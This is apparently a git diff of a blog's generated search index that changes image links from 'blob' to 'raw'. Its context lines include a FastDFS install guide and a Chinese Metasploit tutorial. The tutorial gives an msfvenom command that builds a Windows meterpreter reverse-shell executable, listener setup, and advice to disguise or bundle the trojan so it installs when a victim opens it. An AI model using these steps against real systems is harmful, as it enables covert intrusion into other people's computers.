@@ -276,7 +276,7 @@
 <h3 id="1-1-4-安装fastdfs"><a href="#1-1-4-安装fastdfs" class="headerlink" title="1.1.4 安装fastdfs"></a>1.1.4 安装fastdfs</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf FastDFS_v5.08.tar.gz</span><br><span class="line"></span><br><span class="line">cd FastDFS</span><br><span class="line"></span><br><span class="line">./make.sh</span><br><span class="line"></span><br><span class="line">./make.sh install</span><br></pre></td></tr></table></figure>
 <p>如果安装成功，会看到/etc/init.d/下看到提供的脚本文件:</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ll /etc/init.d/ | grep fdfs</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/q1jy/images/blob/master/img/20211208-image-20211208141057992.png" alt="image-20211208141057992"></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20211208-image-20211208141057992.png" alt="image-20211208141057992"></p>
 <ul>
 <li>fdfs_trackerd是tracker启动脚本</li>
 <li>fdfs_storaged是storage启动脚本</li>
@@ -316,7 +316,7 @@
 <p>设置开机启动</p>
 <figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">chkconfig fdfs_storaged <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
 <p>ps -ef | grep fdfs</p>
-<p><img src="https://gitee.com/q1jy/images/blob/master/img/20211208-image-20211208142953065.png" alt="image-20211208142953065"></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20211208-image-20211208142953065.png" alt="image-20211208142953065"></p>
 ]]></content>
   </entry>
   <entry>
@@ -1282,7 +1282,7 @@
     <url>/post/4cf34f0f.html</url>
     <content><![CDATA[<h1 id="1-什么是MSF"><a href="#1-什么是MSF" class="headerlink" title="1 什么是MSF"></a>1 什么是MSF</h1><p>Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。</p>
 <p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。<span id="more"></span></p>
-<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
 <p>模块分为：</p>
 <p>辅助模块———————AUX</p>
 <p>渗透攻击模块————exploits</p>
@@ -1292,19 +1292,19 @@
 <p>空指令模块——————nops</p>
 <h1 id="2-基本使用方法"><a href="#2-基本使用方法" class="headerlink" title="2 基本使用方法"></a>2 基本使用方法</h1><ol>
 <li><p>在终端中输入<code>msfconsole</code>可以打开这个软件</p>
-<p>这里显示的是我们有多少个模块<img src="https://gitee.com/q1jy/images/blob/master/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
+<p>这里显示的是我们有多少个模块<img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
 </li>
 <li><p>常用命令</p>
 <p>| 常用命令      | 作用                           |<br>| ——————- | ——————————————— |<br>| connect IP    | 远程连接主机，一般用于内网渗透 |<br>| show exploits | 列出框架中所有的攻击渗透模块   |<br>| search _<em>_</em>  | 条件搜索                       |</p>
 <p>比如<code>search ms17_010</code>搜索这个漏洞</p>
-<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
 <p>rank是等级，按可靠性降序排列</p>
 <p>excellent——-great—good—-normal—-average—-low—-manual</p>
 </li>
 </ol>
 <h1 id="3-生成可执行木马"><a href="#3-生成可执行木马" class="headerlink" title="3 生成可执行木马"></a>3 生成可执行木马</h1><ol>
 <li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
-<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
 </li>
 <li><p><code>msfconsole</code>打开msf</p>
 </li>
@@ -1315,7 +1315,7 @@
 <p>(4)命令： <code>set lport 1111</code>（填写刚才生成文件时的端口号）</p>
 <p>(5)命令： <code>show options</code>（查看设置参数）</p>
 <p>(6)命令： <code>exploit -z -j</code>（后台执行）</p>
-<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
 </li>
 <li><p>在靶机打开可执行文件</p>
 <p>这里可以把程序伪装一下，改一下图标，或者把它捆绑在某些软件上面，当用户打开就自动安装到对方电脑上</p>
@@ -1323,7 +1323,7 @@
 <li><p>查看用户</p>
 <p>(1)命令：sessions（查看上钩用户）</p>
 <p>(2)命令：sessions -i 1（选择需要攻击的用户，这里选1）</p>
-<p><img src="https://gitee.com/q1jy/images/blob/master/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
 <p>出现meterpreter就已经成功了</p>
 </li>
 <li><p>meterpreter入侵对方电脑的命令</p>
